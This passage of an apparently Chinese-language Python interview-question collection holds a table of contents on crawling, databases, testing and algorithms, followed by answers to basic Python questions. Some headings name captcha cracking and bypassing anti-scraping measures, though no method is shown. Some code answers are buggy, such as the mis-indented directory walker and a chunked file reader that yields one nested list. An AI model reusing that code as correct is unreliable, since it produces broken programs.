[161.\u722c\u53d6\u6570\u636e\u540e\u4f7f\u7528\u54ea\u4e2a\u6570\u636e\u5e93\u5b58\u50a8\u6570\u636e\u7684\uff0c\u4e3a\u4ec0\u4e48\uff1f](#161\u722c\u53d6\u6570\u636e\u540e\u4f7f\u7528\u54ea\u4e2a\u6570\u636e\u5e93\u5b58\u50a8\u6570\u636e\u7684\u4e3a\u4ec0\u4e48)\n        - [162.\u4f60\u7528\u8fc7\u7684\u722c\u866b\u6846\u67b6\u6216\u8005\u6a21\u5757\u6709\u54ea\u4e9b\uff1f\u4f18\u7f3a\u70b9\uff1f](#162\u4f60\u7528\u8fc7\u7684\u722c\u866b\u6846\u67b6\u6216\u8005\u6a21\u5757\u6709\u54ea\u4e9b\u4f18\u7f3a\u70b9)\n        - [163.\u5199\u722c\u866b\u662f\u7528\u591a\u8fdb\u7a0b\u597d\uff1f\u8fd8\u662f\u591a\u7ebf\u7a0b\u597d\uff1f](#163\u5199\u722c\u866b\u662f\u7528\u591a\u8fdb\u7a0b\u597d\u8fd8\u662f\u591a\u7ebf\u7a0b\u597d)\n        - [164.\u5e38\u89c1\u7684\u53cd\u722c\u866b\u548c\u5e94\u5bf9\u65b9\u6cd5\uff1f](#164\u5e38\u89c1\u7684\u53cd\u722c\u866b\u548c\u5e94\u5bf9\u65b9\u6cd5)\n        - [165.\u89e3\u6790\u7f51\u9875\u7684\u89e3\u6790\u5668\u4f7f\u7528\u6700\u591a\u7684\u662f\u54ea\u51e0\u4e2a?](#165\u89e3\u6790\u7f51\u9875\u7684\u89e3\u6790\u5668\u4f7f\u7528\u6700\u591a\u7684\u662f\u54ea\u51e0\u4e2a)\n        - [166.\u9700\u8981\u767b\u5f55\u7684\u7f51\u9875\uff0c\u5982\u4f55\u89e3\u51b3\u540c\u65f6\u9650\u5236ip\uff0ccookie,session](#166\u9700\u8981\u767b\u5f55\u7684\u7f51\u9875\u5982\u4f55\u89e3\u51b3\u540c\u65f6\u9650\u5236ipcookiesession)\n        - [167.\u9a8c\u8bc1\u7801\u7684\u89e3\u51b3?](#167\u9a8c\u8bc1\u7801\u7684\u89e3\u51b3)\n        - [168.\u4f7f\u7528\u6700\u591a\u7684\u6570\u636e\u5e93\uff0c\u5bf9\u4ed6\u4eec\u7684\u7406\u89e3\uff1f](#168\u4f7f\u7528\u6700\u591a\u7684\u6570\u636e\u5e93\u5bf9\u4ed6\u4eec\u7684\u7406\u89e3)\n        - [169.\u7f16\u5199\u8fc7\u54ea\u4e9b\u722c\u866b\u4e2d\u95f4\u4ef6\uff1f](#169\u7f16\u5199\u8fc7\u54ea\u4e9b\u722c\u866b\u4e2d\u95f4\u4ef6)\n        - [170.\u201c\u6781\u9a8c\u201d\u6ed1\u52a8\u9a8c\u8bc1\u7801\u5982\u4f55\u7834\u89e3\uff1f](#170\u6781\u9a8c\u6ed1\u52a8\u9a8c\u8bc1\u7801\u5982\u4f55\u7834\u89e3)\n        - [171.\u722c\u866b\u591a\u4e45\u722c\u4e00\u6b21\uff0c\u722c\u4e0b\u6765\u7684\u6570\u636e\u662f\u600e\u4e48\u5b58\u50a8\uff1f](#171\u722c\u866b\u591a\u4e45\u722c\u4e00\u6b21\u722c\u4e0b\u6765\u7684\u6570\u636e\u662f\u600e\u4e48\u5b58\u50a8)\n        - [172.cookie\u8fc7\u671f\u7684\u5904\u7406\u95ee\u9898\uff1f](#172cookie\u8fc7\u671f\u7684\u5904\u7406\u95ee\u9898)\n        - [173.\u52a8\u6001\u52a0\u8f7d\u53c8\u5bf9\u53ca\u65f6\u6027\u8981\u6c42\u5f88\u9ad8\u600e\u4e48\u5904\u7406\uff1f](#173\u52a8\u6001\u52a0\u8f7d\u53c8\u5bf9\u53ca\u65f6\u6027\u8981\u6c42\u5f88\u9ad8\u600e\u4e48\u5904\u7406)\n        - [174.HTTPS\u6709\u4ec0\u4e48\u4f18\u70b9\u548c\u7f3a\u70b9\uff1f](#174https\u6709\u4ec0\u4e48\u4f18\u70b9\u548c\u7f3a\u70b9)\n        - [175.HTTPS\u662f\u5982\u4f55\u5b9e\u73b0\u5b89\u5168\u4f20\u8f93\u6570\u636e\u7684\uff1f](#175https\u662f\u5982\u4f55\u5b9e\u73b0\u5b89\u5168\u4f20\u8f93\u6570\u636e\u7684)\n        - [176.TTL\uff0cMSL\uff0cRTT\u5404\u662f\u4ec0\u4e48\uff1f](#176ttlmslrtt\u5404\u662f\u4ec0\u4e48)\n        - [177.\u8c08\u4e00\u8c08\u4f60\u5bf9Selenium\u548cPhantomJS\u4e86\u89e3](#177\u8c08\u4e00\u8c08\u4f60\u5bf9selenium\u548cphantomjs\u4e86\u89e3)\n        - [178.\u5e73\u5e38\u600e\u4e48\u4f7f\u7528\u4ee3\u7406\u7684 \uff1f](#178\u5e73\u5e38\u600e\u4e48\u4f7f\u7528\u4ee3\u7406\u7684-)\n        - [179.\u5b58\u653e\u5728\u6570\u636e\u5e93(redis\u3001mysql\u7b49)\u3002](#179\u5b58\u653e\u5728\u6570\u636e\u5e93redismysql\u7b49)\n        - [180.\u600e\u4e48\u76d1\u63a7\u722c\u866b\u7684\u72b6\u6001?](#180\u600e\u4e48\u76d1\u63a7\u722c\u866b\u7684\u72b6\u6001)\n        - [181.\u63cf\u8ff0\u4e0bscrapy\u6846\u67b6\u8fd0\u884c\u7684\u673a\u5236\uff1f](#181\u63cf\u8ff0\u4e0bscrapy\u6846\u67b6\u8fd0\u884c\u7684\u673a\u5236)\n        - [182.\u8c08\u8c08\u4f60\u5bf9Scrapy\u7684\u7406\u89e3\uff1f](#182\u8c08\u8c08\u4f60\u5bf9scrapy\u7684\u7406\u89e3)\n        - [183.\u600e\u4e48\u6837\u8ba9 scrapy \u6846\u67b6\u53d1\u9001\u4e00\u4e2a post \u8bf7\u6c42\uff08\u5177\u4f53\u5199\u51fa\u6765\uff09](#183\u600e\u4e48\u6837\u8ba9-scrapy-\u6846\u67b6\u53d1\u9001\u4e00\u4e2a-post-\u8bf7\u6c42\u5177\u4f53\u5199\u51fa\u6765)\n        - [184.\u600e\u4e48\u76d1\u63a7\u722c\u866b\u7684\u72b6\u6001 \uff1f](#184\u600e\u4e48\u76d1\u63a7\u722c\u866b\u7684\u72b6\u6001-)\n        - [185.\u600e\u4e48\u5224\u65ad\u7f51\u7ad9\u662f\u5426\u66f4\u65b0\uff1f](#185\u600e\u4e48\u5224\u65ad\u7f51\u7ad9\u662f\u5426\u66f4\u65b0)\n        - [186.\u56fe\u7247\u3001\u89c6\u9891\u722c\u53d6\u600e\u4e48\u7ed5\u8fc7\u9632\u76d7\u8fde\u63a5](#186\u56fe\u7247\u89c6\u9891\u722c\u53d6\u600e\u4e48\u7ed5\u8fc7\u9632\u76d7\u8fde\u63a5)\n        - [187.\u4f60\u722c\u51fa\u6765\u7684\u6570\u636e\u91cf\u5927\u6982\u6709\u591a\u5927\uff1f\u5927\u6982\u591a\u957f\u65f6\u95f4\u722c\u4e00\u6b21\uff1f](#187\u4f60\u722c\u51fa\u6765\u7684\u6570\u636e\u91cf\u5927\u6982\u6709\u591a\u5927\u5927\u6982\u591a\u957f\u65f6\u95f4\u722c\u4e00\u6b21)\n        - [188.\u7528\u4ec0\u4e48\u6570\u636e\u5e93\u5b58\u722c\u4e0b\u6765\u7684\u6570\u636e\uff1f\u90e8\u7f72\u662f\u4f60\u505a\u7684\u5417\uff1f\u600e\u4e48\u90e8\u7f72\uff1f](#188\u7528\u4ec0\u4e48\u6570\u636e\u5e93\u5b58\u722c\u4e0b\u6765\u7684\u6570\u636e\u90e8\u7f72\u662f\u4f60\u505a\u7684\u5417\u600e\u4e48\u90e8\u7f72)\n        - [189.\u589e\u91cf\u722c\u53d6](#189\u589e\u91cf\u722c\u53d6)\n        - [190.\u722c\u53d6\u4e0b\u6765\u7684\u6570\u636e\u5982\u4f55\u53bb\u91cd\uff0c\u8bf4\u4e00\u4e0bscrapy\u7684\u5177\u4f53\u7684\u7b97\u6cd5\u4f9d\u636e\u3002](#190\u722c\u53d6\u4e0b\u6765\u7684\u6570\u636e\u5982\u4f55\u53bb\u91cd\u8bf4\u4e00\u4e0bscrapy\u7684\u5177\u4f53\u7684\u7b97\u6cd5\u4f9d\u636e)\n        - [191.Scrapy\u7684\u4f18\u7f3a\u70b9?](#191scrapy\u7684\u4f18\u7f3a\u70b9)\n        - [192.\u600e\u4e48\u8bbe\u7f6e\u722c\u53d6\u6df1\u5ea6\uff1f](#192\u600e\u4e48\u8bbe\u7f6e\u722c\u53d6\u6df1\u5ea6)\n        - [193.scrapy\u548cscrapy-redis\u6709\u4ec0\u4e48\u533a\u522b\uff1f\u4e3a\u4ec0\u4e48\u9009\u62e9redis\u6570\u636e\u5e93\uff1f](#193scrapy\u548cscrapy-redis\u6709\u4ec0\u4e48\u533a\u522b\u4e3a\u4ec0\u4e48\u9009\u62e9redis\u6570\u636e\u5e93)\n        - [194.\u5206\u5e03\u5f0f\u722c\u866b\u4e3b\u8981\u89e3\u51b3\u4ec0\u4e48\u95ee\u9898\uff1f](#194\u5206\u5e03\u5f0f\u722c\u866b\u4e3b\u8981\u89e3\u51b3\u4ec0\u4e48\u95ee\u9898)\n        - [195.\u4ec0\u4e48\u662f\u5206\u5e03\u5f0f\u5b58\u50a8\uff1f](#195\u4ec0\u4e48\u662f\u5206\u5e03\u5f0f\u5b58\u50a8)\n        - [196.\u4f60\u6240\u77e5\u9053\u7684\u5206\u5e03\u5f0f\u722c\u866b\u65b9\u6848\u6709\u54ea\u4e9b\uff1f](#196\u4f60\u6240\u77e5\u9053\u7684\u5206\u5e03\u5f0f\u722c\u866b\u65b9\u6848\u6709\u54ea\u4e9b)\n        - [197.scrapy-redis\uff0c\u6709\u505a\u8fc7\u5176\u4ed6\u7684\u5206\u5e03\u5f0f\u722c\u866b\u5417\uff1f](#197scrapy-redis\u6709\u505a\u8fc7\u5176\u4ed6\u7684\u5206\u5e03\u5f0f\u722c\u866b\u5417)\n- [\u6570\u636e\u5e93](#\u6570\u636e\u5e93)\n    - [MySQL](#mysql)\n        - [198.\u4e3b\u952e \u8d85\u952e \u5019\u9009\u952e \u5916\u952e](#198\u4e3b\u952e-\u8d85\u952e-\u5019\u9009\u952e-\u5916\u952e)\n        - [199.\u89c6\u56fe\u7684\u4f5c\u7528\uff0c\u89c6\u56fe\u53ef\u4ee5\u66f4\u6539\u4e48\uff1f](#199\u89c6\u56fe\u7684\u4f5c\u7528\u89c6\u56fe\u53ef\u4ee5\u66f4\u6539\u4e48)\n        - [200.drop,delete\u4e0etruncate\u7684\u533a\u522b](#200dropdelete\u4e0etruncate\u7684\u533a\u522b)\n        - [201.\u7d22\u5f15\u7684\u5de5\u4f5c\u539f\u7406\u53ca\u5176\u79cd\u7c7b](#201\u7d22\u5f15\u7684\u5de5\u4f5c\u539f\u7406\u53ca\u5176\u79cd\u7c7b)\n        - [202.\u8fde\u63a5\u7684\u79cd\u7c7b](#202\u8fde\u63a5\u7684\u79cd\u7c7b)\n        - [203.\u6570\u636e\u5e93\u4f18\u5316\u7684\u601d\u8def](#203\u6570\u636e\u5e93\u4f18\u5316\u7684\u601d\u8def)\n        - [204.\u5b58\u50a8\u8fc7\u7a0b\u4e0e\u89e6\u53d1\u5668\u7684\u533a\u522b](#204\u5b58\u50a8\u8fc7\u7a0b\u4e0e\u89e6\u53d1\u5668\u7684\u533a\u522b)\n        - [205.\u60b2\u89c2\u9501\u548c\u4e50\u89c2\u9501\u662f\u4ec0\u4e48\uff1f](#205\u60b2\u89c2\u9501\u548c\u4e50\u89c2\u9501\u662f\u4ec0\u4e48)\n        - [206.\u4f60\u5e38\u7528\u7684mysql\u5f15\u64ce\u6709\u54ea\u4e9b?\u5404\u5f15\u64ce\u95f4\u6709\u4ec0\u4e48\u533a\u522b?](#206\u4f60\u5e38\u7528\u7684mysql\u5f15\u64ce\u6709\u54ea\u4e9b\u5404\u5f15\u64ce\u95f4\u6709\u4ec0\u4e48\u533a\u522b)\n    - [Redis](#redis)\n        - [207.Redis\u5b95\u673a\u600e\u4e48\u89e3\u51b3?](#207redis\u5b95\u673a\u600e\u4e48\u89e3\u51b3)\n        - [208.redis\u548cmecached\u7684\u533a\u522b\uff0c\u4ee5\u53ca\u4f7f\u7528\u573a\u666f](#208redis\u548cmecached\u7684\u533a\u522b\u4ee5\u53ca\u4f7f\u7528\u573a\u666f)\n        - [209.Redis\u96c6\u7fa4\u65b9\u6848\u8be5\u600e\u4e48\u505a?\u90fd\u6709\u54ea\u4e9b\u65b9\u6848?](#209redis\u96c6\u7fa4\u65b9\u6848\u8be5\u600e\u4e48\u505a\u90fd\u6709\u54ea\u4e9b\u65b9\u6848)\n        - [210.Redis\u56de\u6536\u8fdb\u7a0b\u662f\u5982\u4f55\u5de5\u4f5c\u7684](#210redis\u56de\u6536\u8fdb\u7a0b\u662f\u5982\u4f55\u5de5\u4f5c\u7684)\n    - [MongoDB](#mongodb)\n        - [211.MongoDB\u4e2d\u5bf9\u591a\u6761\u8bb0\u5f55\u505a\u66f4\u65b0\u64cd\u4f5c\u547d\u4ee4\u662f\u4ec0\u4e48\uff1f](#211mongodb\u4e2d\u5bf9\u591a\u6761\u8bb0\u5f55\u505a\u66f4\u65b0\u64cd\u4f5c\u547d\u4ee4\u662f\u4ec0\u4e48)\n        - [212.MongoDB\u5982\u4f55\u624d\u4f1a\u62d3\u5c55\u5230\u591a\u4e2ashard\u91cc\uff1f](#212mongodb\u5982\u4f55\u624d\u4f1a\u62d3\u5c55\u5230\u591a\u4e2ashard\u91cc)\n    - [\u6d4b\u8bd5](#\u6d4b\u8bd5)\n        - [213.\u7f16\u5199\u6d4b\u8bd5\u8ba1\u5212\u7684\u76ee\u7684\u662f](#213\u7f16\u5199\u6d4b\u8bd5\u8ba1\u5212\u7684\u76ee\u7684\u662f)\n        - [214.\u5bf9\u5173\u952e\u8bcd\u89e6\u53d1\u6a21\u5757\u8fdb\u884c\u6d4b\u8bd5](#214\u5bf9\u5173\u952e\u8bcd\u89e6\u53d1\u6a21\u5757\u8fdb\u884c\u6d4b\u8bd5)\n        - [215.\u5176\u4ed6\u5e38\u7528\u7b14\u8bd5\u9898\u76ee\u7f51\u5740\u6c47\u603b](#215\u5176\u4ed6\u5e38\u7528\u7b14\u8bd5\u9898\u76ee\u7f51\u5740\u6c47\u603b)\n        - [216.\u6d4b\u8bd5\u4eba\u5458\u5728\u8f6f\u4ef6\u5f00\u53d1\u8fc7\u7a0b\u4e2d\u7684\u4efb\u52a1\u662f\u4ec0\u4e48](#216\u6d4b\u8bd5\u4eba\u5458\u5728\u8f6f\u4ef6\u5f00\u53d1\u8fc7\u7a0b\u4e2d\u7684\u4efb\u52a1\u662f\u4ec0\u4e48)\n        - [217.\u4e00\u6761\u8f6f\u4ef6Bug\u8bb0\u5f55\u90fd\u5305\u542b\u4e86\u54ea\u4e9b\u5185\u5bb9\uff1f](#217\u4e00\u6761\u8f6f\u4ef6bug\u8bb0\u5f55\u90fd\u5305\u542b\u4e86\u54ea\u4e9b\u5185\u5bb9)\n        - [218.\u7b80\u8ff0\u9ed1\u76d2\u6d4b\u8bd5\u548c\u767d\u76d2\u6d4b\u8bd5\u7684\u4f18\u7f3a\u70b9](#218\u7b80\u8ff0\u9ed1\u76d2\u6d4b\u8bd5\u548c\u767d\u76d2\u6d4b\u8bd5\u7684\u4f18\u7f3a\u70b9)\n        - [219.\u8bf7\u5217\u51fa\u4f60\u6240\u77e5\u9053\u7684\u8f6f\u4ef6\u6d4b\u8bd5\u79cd\u7c7b\uff0c\u81f3\u5c115\u9879](#219\u8bf7\u5217\u51fa\u4f60\u6240\u77e5\u9053\u7684\u8f6f\u4ef6\u6d4b\u8bd5\u79cd\u7c7b\u81f3\u5c115\u9879)\n        - [220.Alpha\u6d4b\u8bd5\u4e0eBeta\u6d4b\u8bd5\u7684\u533a\u522b\u662f\u4ec0\u4e48\uff1f](#220alpha\u6d4b\u8bd5\u4e0ebeta\u6d4b\u8bd5\u7684\u533a\u522b\u662f\u4ec0\u4e48)\n        - [221.\u4e3e\u4f8b\u8bf4\u660e\u4ec0\u4e48\u662fBug\uff1f\u4e00\u4e2abug report\u5e94\u5305\u542b\u4ec0\u4e48\u5173\u952e\u5b57\uff1f](#221\u4e3e\u4f8b\u8bf4\u660e\u4ec0\u4e48\u662fbug\u4e00\u4e2abug-report\u5e94\u5305\u542b\u4ec0\u4e48\u5173\u952e\u5b57)\n    - [\u6570\u636e\u7ed3\u6784](#\u6570\u636e\u7ed3\u6784)\n        - [222.\u6570\u7ec4\u4e2d\u51fa\u73b0\u6b21\u6570\u8d85\u8fc7\u4e00\u534a\u7684\u6570\u5b57-Python\u7248](#222\u6570\u7ec4\u4e2d\u51fa\u73b0\u6b21\u6570\u8d85\u8fc7\u4e00\u534a\u7684\u6570\u5b57-python\u7248)\n        - [223.\u6c42100\u4ee5\u5185\u7684\u8d28\u6570](#223\u6c42100\u4ee5\u5185\u7684\u8d28\u6570)\n        - [224.\u65e0\u91cd\u590d\u5b57\u7b26\u7684\u6700\u957f\u5b50\u4e32-Python\u5b9e\u73b0](#224\u65e0\u91cd\u590d\u5b57\u7b26\u7684\u6700\u957f\u5b50\u4e32-python\u5b9e\u73b0)\n        - [225.\u901a\u8fc72\u4e2a5\/6\u5347\u5f97\u6c34\u58f6\u4ece\u6c60\u5858\u5f97\u52303\u5347\u6c34](#225\u901a\u8fc72\u4e2a56\u5347\u5f97\u6c34\u58f6\u4ece\u6c60\u5858\u5f97\u52303\u5347\u6c34)\n        - [226.\u4ec0\u4e48\u662fMD5\u52a0\u5bc6\uff0c\u6709\u4ec0\u4e48\u7279\u70b9\uff1f](#226\u4ec0\u4e48\u662fmd5\u52a0\u5bc6\u6709\u4ec0\u4e48\u7279\u70b9)\n        - [227.\u4ec0\u4e48\u662f\u5bf9\u79f0\u52a0\u5bc6\u548c\u975e\u5bf9\u79f0\u52a0\u5bc6](#227\u4ec0\u4e48\u662f\u5bf9\u79f0\u52a0\u5bc6\u548c\u975e\u5bf9\u79f0\u52a0\u5bc6)\n        - [228.\u5192\u6ce1\u6392\u5e8f\u7684\u601d\u60f3\uff1f](#228\u5192\u6ce1\u6392\u5e8f\u7684\u601d\u60f3)\n        - [229.\u5feb\u901f\u6392\u5e8f\u7684\u601d\u60f3\uff1f](#229\u5feb\u901f\u6392\u5e8f\u7684\u601d\u60f3)\n        - [230.\u5982\u4f55\u5224\u65ad\u5355\u5411\u94fe\u8868\u4e2d\u662f\u5426\u6709\u73af\uff1f](#230\u5982\u4f55\u5224\u65ad\u5355\u5411\u94fe\u8868\u4e2d\u662f\u5426\u6709\u73af)\n        - [231.\u4f60\u77e5\u9053\u54ea\u4e9b\u6392\u5e8f\u7b97\u6cd5\uff08\u4e00\u822c\u662f\u901a\u8fc7\u95ee\u9898\u8003\u7b97\u6cd5\uff09](#231\u4f60\u77e5\u9053\u54ea\u4e9b\u6392\u5e8f\u7b97\u6cd5\u4e00\u822c\u662f\u901a\u8fc7\u95ee\u9898\u8003\u7b97\u6cd5)\n        - [232.\u6590\u6ce2\u90a3\u5951\u6570\u5217](#232\u6590\u6ce2\u90a3\u5951\u6570\u5217)\n        - [233.\u5982\u4f55\u7ffb\u8f6c\u4e00\u4e2a\u5355\u94fe\u8868\uff1f](#233\u5982\u4f55\u7ffb\u8f6c\u4e00\u4e2a\u5355\u94fe\u8868)\n        - [234.\u9752\u86d9\u8df3\u53f0\u9636\u95ee\u9898](#234\u9752\u86d9\u8df3\u53f0\u9636\u95ee\u9898)\n        - [235.\u4e24\u6570\u4e4b\u548c Two Sum](#235\u4e24\u6570\u4e4b\u548c-two-sum)\n        - [236.\u641c\u7d22\u65cb\u8f6c\u6392\u5e8f\u6570\u7ec4 Search in Rotated Sorted Array](#236\u641c\u7d22\u65cb\u8f6c\u6392\u5e8f\u6570\u7ec4-search-in-rotated-sorted-array)\n        - [237.Python\u5b9e\u73b0\u4e00\u4e2aStack\u7684\u6570\u636e\u7ed3\u6784](#237python\u5b9e\u73b0\u4e00\u4e2astack\u7684\u6570\u636e\u7ed3\u6784)\n        - [238.\u5199\u4e00\u4e2a\u4e8c\u5206\u67e5\u627e](#238\u5199\u4e00\u4e2a\u4e8c\u5206\u67e5\u627e)\n        - [239.set \u7528 in \u65f6\u95f4\u590d\u6742\u5ea6\u662f\u591a\u5c11\uff0c\u4e3a\u4ec0\u4e48\uff1f](#239set-\u7528-in-\u65f6\u95f4\u590d\u6742\u5ea6\u662f\u591a\u5c11\u4e3a\u4ec0\u4e48)\n        - [240.\u5217\u8868\u4e2d\u6709n\u4e2a\u6b63\u6574\u6570\u8303\u56f4\u5728[0\uff0c1000]\uff0c\u8fdb\u884c\u6392\u5e8f\uff1b](#240\u5217\u8868\u4e2d\u6709n\u4e2a\u6b63\u6574\u6570\u8303\u56f4\u572801000\u8fdb\u884c\u6392\u5e8f)\n        - [241.\u9762\u5411\u5bf9\u8c61\u7f16\u7a0b\u4e2d\u6709\u7ec4\u5408\u548c\u7ee7\u627f\u7684\u65b9\u6cd5\u5b9e\u73b0\u65b0\u7684\u7c7b](#241\u9762\u5411\u5bf9\u8c61\u7f16\u7a0b\u4e2d\u6709\u7ec4\u5408\u548c\u7ee7\u627f\u7684\u65b9\u6cd5\u5b9e\u73b0\u65b0\u7684\u7c7b)\n    - [\u5927\u6570\u636e](#\u5927\u6570\u636e)\n        - [242.\u627e\u51fa1G\u7684\u6587\u4ef6\u4e2d\u9ad8\u9891\u8bcd](#242\u627e\u51fa1g\u7684\u6587\u4ef6\u4e2d\u9ad8\u9891\u8bcd)\n        - [243.\u4e00\u4e2a\u5927\u7ea6\u6709\u4e00\u4e07\u884c\u7684\u6587\u672c\u6587\u4ef6\u7edf\u8ba1\u9ad8\u9891\u8bcd](#243\u4e00\u4e2a\u5927\u7ea6\u6709\u4e00\u4e07\u884c\u7684\u6587\u672c\u6587\u4ef6\u7edf\u8ba1\u9ad8\u9891\u8bcd)\n        - [244.\u600e\u4e48\u5728\u6d77\u91cf\u6570\u636e\u4e2d\u627e\u51fa\u91cd\u590d\u6b21\u6570\u6700\u591a\u7684\u4e00\u4e2a\uff1f](#244\u600e\u4e48\u5728\u6d77\u91cf\u6570\u636e\u4e2d\u627e\u51fa\u91cd\u590d\u6b21\u6570\u6700\u591a\u7684\u4e00\u4e2a)\n        - [245.\u5224\u65ad\u6570\u636e\u662f\u5426\u5728\u5927\u91cf\u6570\u636e\u4e2d](#245\u5224\u65ad\u6570\u636e\u662f\u5426\u5728\u5927\u91cf\u6570\u636e\u4e2d)\n\n\n\n<!-- \/TOC -->\n\n# Python\u57fa\u7840\n## \u6587\u4ef6\u64cd\u4f5c\n### 1.\u6709\u4e00\u4e2ajsonline\u683c\u5f0f\u7684\u6587\u4ef6file.txt\u5927\u5c0f\u7ea6\u4e3a10K\n```python\ndef get_lines():\n    with open('file.txt','rb') as f:\n        return f.readlines()\n\nif __name__ == '__main__':\n    for e in get_lines():\n        process(e) # \u5904\u7406\u6bcf\u4e00\u884c\u6570\u636e\n```\n\u73b0\u5728\u8981\u5904\u7406\u4e00\u4e2a\u5927\u5c0f\u4e3a10G\u7684\u6587\u4ef6\uff0c\u4f46\u662f\u5185\u5b58\u53ea\u67094G\uff0c\u5982\u679c\u5728\u53ea\u4fee\u6539get_lines \u51fd\u6570\u800c\u5176\u4ed6\u4ee3\u7801\u4fdd\u6301\u4e0d\u53d8\u7684\u60c5\u51b5\u4e0b\uff0c\u5e94\u8be5\u5982\u4f55\u5b9e\u73b0\uff1f\u9700\u8981\u8003\u8651\u7684\u95ee\u9898\u90fd\u6709\u90a3\u4e9b\uff1f\n```python\ndef get_lines():\n    with open('file.txt','rb') as f:\n        for i in f:\n            yield i\n```\n\u4e2a\u4eba\u8ba4\u4e3a\uff1a\u8fd8\u662f\u8bbe\u7f6e\u4e0b\u6bcf\u6b21\u8fd4\u56de\u7684\u884c\u6570\u8f83\u597d\uff0c\u5426\u5219\u8bfb\u53d6\u6b21\u6570\u592a\u591a\u3002\n```\ndef get_lines():\n    l = []\n    with open('file.txt','rb') as f:\n      data = f.readlines(60000)\n    l.append(data)\n    yield l\n```\nPandaaaa906\u63d0\u4f9b\u7684\u65b9\u6cd5\n```python\nfrom mmap import mmap\n\n\ndef get_lines(fp):\n    with open(fp,\"r+\") as f:\n        m = mmap(f.fileno(), 0)\n        tmp = 0\n        for i, char in enumerate(m):\n            if char==b\"\\n\":\n                yield m[tmp:i+1].decode()\n                tmp = i+1\n\nif __name__==\"__main__\":\n    for i in get_lines(\"fp_some_huge_file\"):\n        print(i)\n```\n\u8981\u8003\u8651\u7684\u95ee\u9898\u6709\uff1a\u5185\u5b58\u53ea\u67094G\u65e0\u6cd5\u4e00\u6b21\u6027\u8bfb\u516510G\u6587\u4ef6\uff0c\u9700\u8981\u5206\u6279\u8bfb\u5165\u5206\u6279\u8bfb\u5165\u6570\u636e\u8981\u8bb0\u5f55\u6bcf\u6b21\u8bfb\u5165\u6570\u636e\u7684\u4f4d\u7f6e\u3002\u5206\u6279\u6bcf\u6b21\u8bfb\u53d6\u6570\u636e\u7684\u5927\u5c0f\uff0c\u592a\u5c0f\u4f1a\u5728\u8bfb\u53d6\u64cd\u4f5c\u82b1\u8d39\u8fc7\u591a\u65f6\u95f4\u3002\nhttps:\/\/stackoverflow.com\/questions\/30294146\/python-fastest-way-to-process-large-file\n\n###  2.\u8865\u5145\u7f3a\u5931\u7684\u4ee3\u7801\n```python\ndef print_directory_contents(sPath):\n\"\"\"\n\u8fd9\u4e2a\u51fd\u6570\u63a5\u6536\u6587\u4ef6\u5939\u7684\u540d\u79f0\u4f5c\u4e3a\u8f93\u5165\u53c2\u6570\n\u8fd4\u56de\u8be5\u6587\u4ef6\u5939\u4e2d\u6587\u4ef6\u7684\u8def\u5f84\n\u4ee5\u53ca\u5176\u5305\u542b\u6587\u4ef6\u5939\u4e2d\u6587\u4ef6\u7684\u8def\u5f84\n\"\"\"\nimport os\nfor s_child in os.listdir(s_path):\n    s_child_path = os.path.join(s_path, s_child)\n    if os.path.isdir(s_child_path):\n        print_directory_contents(s_child_path)\n    else:\n        print(s_child_path)\n```\n## \u6a21\u5757\u4e0e\u5305\n### 3.\u8f93\u5165\u65e5\u671f\uff0c \u5224\u65ad\u8fd9\u4e00\u5929\u662f\u8fd9\u4e00\u5e74\u7684\u7b2c\u51e0\u5929\uff1f\n```python\nimport datetime\ndef dayofyear():\n    year = input(\"\u8bf7\u8f93\u5165\u5e74\u4efd: \")\n    month = input(\"\u8bf7\u8f93\u5165\u6708\u4efd: \")\n    day = input(\"\u8bf7\u8f93\u5165\u5929: \")\n    date1 = datetime.date(year=int(year),month=int(month),day=int(day))\n    date2 = datetime.date(year=int(year),month=1,day=1)\n    return (date1-date2).days+1\n```\n### 4.\u6253\u4e71\u4e00\u4e2a\u6392\u597d\u5e8f\u7684list\u5bf9\u8c61alist\uff1f\n```python\nimport random\nalist = [1,2,3,4,5]\nrandom.shuffle(alist)\nprint(alist)\n```\n## \u6570\u636e\u7c7b\u578b\n### 5.\u73b0\u6709\u5b57\u5178 d= {'a':24,'g':52,'i':12,'k':33}\u8bf7\u6309value\u503c\u8fdb\u884c\u6392\u5e8f?\n```python\nsorted(d.items(),key=lambda x:x[1])\n```\n    x[0]\u4ee3\u8868\u7528key\u8fdb\u884c\u6392\u5e8f\uff1bx[1]\u4ee3\u8868\u7528value\u8fdb\u884c\u6392\u5e8f\u3002\n### 6.\u5b57\u5178\u63a8\u5bfc\u5f0f\n```python\nd = {key:value for (key,value) in iterable}\n```\n### 7.\u8bf7\u53cd\u8f6c\u5b57\u7b26\u4e32 \"aStr\"?\n```python\nprint(\"aStr\"[::-1])\n```\n### 8.\u5c06\u5b57\u7b26\u4e32 \"k:1 |k1:2|k2:3|k3:4\"\uff0c\u5904\u7406\u6210\u5b57\u5178 {k:1,k1:2,...}\n```python\nstr1 = \"k:1|k1:2|k2:3|k3:4\"\ndef str2dict(str1):\n    dict1 = {}\n    for iterms in str1.split('|'):\n        key,value = iterms.split(':')\n        dict1[key] = value\n    return dict1\n#\u5b57\u5178\u63a8\u5bfc\u5f0f\nd = {k:int(v) for t in str1.split(\"|\") for k, v in (t.split(\":\"), )}\n```\n### 9.\u8bf7\u6309alist\u4e2d\u5143\u7d20\u7684age\u7531\u5927\u5230\u5c0f\u6392\u5e8f\n```python\nalist = [{'name':'a','age':20},{'name':'b','age':30},{'name':'c','age':25}]\ndef sort_by_age(list1):\n    return sorted(alist,key=lambda x:x['age'],reverse=True)\n```\n### 10.\u4e0b\u9762\u4ee3\u7801\u7684\u8f93\u51fa\u7ed3\u679c\u5c06\u662f\u4ec0\u4e48\uff1f\n```python\nlist = ['a','b','c','d','e']\nprint(list[10:])\n```\n\u4ee3\u7801\u5c06\u8f93\u51fa[],\u4e0d\u4f1a\u4ea7\u751fIndexError\u9519\u8bef\uff0c\u5c31\u50cf\u6240\u671f\u671b\u7684\u90a3\u6837\uff0c\u5c1d\u8bd5\u7528\u8d85\u51fa\u6210\u5458\u7684\u4e2a\u6570\u7684index\u6765\u83b7\u53d6\u67d0\u4e2a\u5217\u8868\u7684\u6210\u5458\u3002\u4f8b\u5982\uff0c\u5c1d\u8bd5\u83b7\u53d6list[10]\u548c\u4e4b\u540e\u7684\u6210\u5458\uff0c\u4f1a\u5bfc\u81f4IndexError\u3002\u7136\u800c\uff0c\u5c1d\u8bd5\u83b7\u53d6\u5217\u8868\u7684\u5207\u7247\uff0c\u5f00\u59cb\u7684index\u8d85\u8fc7\u4e86\u6210\u5458\u4e2a\u6570\u4e0d\u4f1a\u4ea7\u751fIndexError\uff0c\u800c\u662f\u4ec5\u4ec5\u8fd